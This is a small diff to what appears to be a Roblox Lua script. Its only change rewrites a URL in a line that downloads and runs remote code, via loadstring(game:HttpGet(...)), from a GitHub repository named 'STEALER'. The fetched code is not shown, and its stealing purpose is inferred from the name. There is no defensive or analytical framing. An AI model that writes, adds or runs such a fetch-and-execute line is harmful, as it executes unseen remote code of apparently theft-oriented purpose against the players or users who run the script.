@@ -27,5 +27,5 @@ end)
 -- ==========================================
 
 task.spawn(function()
-	loadstring(game:HttpGet("https://github.com/JOSERAX11/STEALER/raw/refs/heads/main/main/core.lua"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/JOSERAX11/STEALER/refs/heads/main/main/core.lua"))()
 end)
